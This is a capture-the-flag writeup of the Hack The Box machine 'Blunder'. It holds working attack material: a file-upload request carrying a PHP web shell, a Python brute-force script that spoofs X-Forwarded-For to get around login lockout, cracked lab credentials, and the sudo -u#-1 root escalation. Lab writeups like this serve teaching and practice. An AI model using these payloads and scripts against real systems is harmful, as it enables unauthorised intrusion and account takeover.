---
title: "Blunder"
description: "Writeup for Blunder machine from HTB"
date: 2020-08-01
author: "Pablo Jesús González Rubio"
cover: "blunder.png"
coverAlt: "Blunder icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

In hosts: `10.10.10.191 blunder.htb`

```
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

## Enumeration

Gobuster:

```
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/usb (Status: 200)
/stephen-king-0 (Status: 200)
/stadia (Status: 200)
/bl-kernel (Status: 200)
/cgi-bin/ (Status: 301)
/install.php (Status: 200)
/LICENSE (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/todo.txt (Status: 200)
```

Looking inside `/bl-kernel` we see a file `users.class.php` with `Bludit CMS` written in clear plain text.

Inside `todo.txt` we find:

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

As it says `Update the CMS` and it's not done yet, we acknowledge it's old and it could have some exploits. Doing a `searchsploit bludit` we find there's an arbitrary file upload exploit for the oldest version, so we try it!

We have to reproduce this:

```php
POST /admin/ajax/upload-files HTTP/1.1
Host: 192.168.140.154
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.140.154/admin/new-content
X-Requested-With: XMLHttpRequest
Content-Length: 415
Content-Type: multipart/form-data; boundary=---------------------------26228568510541774541866388118
Cookie: BLUDIT-KEY=5s634f6up72tmfi050i4okunf9
Connection: close

-----------------------------26228568510541774541866388118
Content-Disposition: form-data; name="tokenCSRF"

67987ea926223b28949695d6936191d28d320f20
-----------------------------26228568510541774541866388118
Content-Disposition: form-data; name="bluditInputFiles[]"; filename="poc.php"
Content-Type: image/png

<?php system($_GET["cmd"]);?>

-----------------------------26228568510541774541866388118--
```

This tells us doing a POST to `/admin/ajax/upload-files` could let us upload a file. When entering that page via a GET the page is blank, the login form doesn't appear. Before that, we need to log in.

The user seems to be `fergus` (from the *todo.txt*) but we don't have the password, so we can create a custom wordlist based on the webpage:

```
cewl -d 3 -m 5 -w custom_wordlist.txt blunder.htb
```

And with the custom wordlist we can do a custom python script to brute-force the login:

```python
#!/usr/bin/env python3
import re
import requests

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open_ressources('./custom_wordlist.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

So we got `fergus:RolandDeschain`!

## Exploitation

I tried to replicate the exploit (before mentioned) with Burp Suite but it didn't work for me so I carried on with Metasploit and got a Meterpreter.

## Privilege Escalation

### User

I couldn't find anything interesting searching as `WWW-Data` with LinEnum, so went to the Bludit directory to search if it was anything interesting in the database (as it's a CMS).

Found `Hugo:faca404fd5c0a31cf1897b823c695c85cffeb98d`

But that is a salted password so we send it to Crackstation and the final login is: `Hugo:Password120`.

We issue `su hugo`, enter the password and we are user `Hugo`!

### Root

We try `sudo -l` to see which commands we can run as `root` while still being Hugo, it lists:

```
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

`ALL=(ALL,!root) /bin/bash` can be exploited through the `sudo` vulnerability of 2019, where you can issue `sudo -u#-1 /bin/bash` and you get instant `root` access.

A Linux system has UIDS of the users, where `root` has the UID 0, well, this exploit tells the system to execute `/bin/bash` with user `-1`.

> This is because the Sudo command itself is already running as user ID 0 so when Sudo tries to change to user ID -1, no change occurs.

More info on [sudo](https://www.sudo.ws/alerts/minus_1_uid.html) website.

